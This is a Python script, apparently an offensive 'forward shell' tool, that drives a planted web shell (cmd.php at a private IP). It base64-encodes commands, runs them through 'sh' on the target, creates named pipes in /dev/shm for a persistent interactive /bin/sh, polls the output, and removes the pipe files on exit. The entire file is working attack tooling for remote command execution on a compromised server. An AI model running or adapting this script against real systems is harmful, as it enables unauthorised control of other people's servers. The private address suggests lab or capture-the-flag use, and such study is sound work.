#!/usr/bin/python3

import requests, time, sys, signal, threading
from base64 import b64encode
from random import randrange

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s """ % (stdin)
erasestdout = """/bin/rm %s """ % (stdout)
#clearoutput = """echo '' > %s""" % (stdout)

class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput= """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d | sh' % (cmd)
	}

	result = (requests.get('http://192.168.31.178/cmd.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
        cmd = cmd.encode('utf-8')
        cmd = b64encode(cmd).decode('utf-8')
        payload = {
                'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
        }

        result = (requests.get('http://192.168.31.178/cmd.php', params=payload, timeout=5).text).strip()
        return result


# mkfifo input; tail -f  input | /bin/sh 2>&1 > output
def SetupShell():
	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None


#def ReadCmd():
#        GetOutput = """/bin/cat %s """ % (stdout)
#        output = RunCmd(GetOutput)
#        return output


SetupShell()
ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	print("[*] Removing File...\n")
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print("[*] All Files have bee deleted\n")
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)


while True:
	cmd = input ("$~")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)
	#response = ReadCmd()
	#print(response)
	#RunCmd(clearoutput)
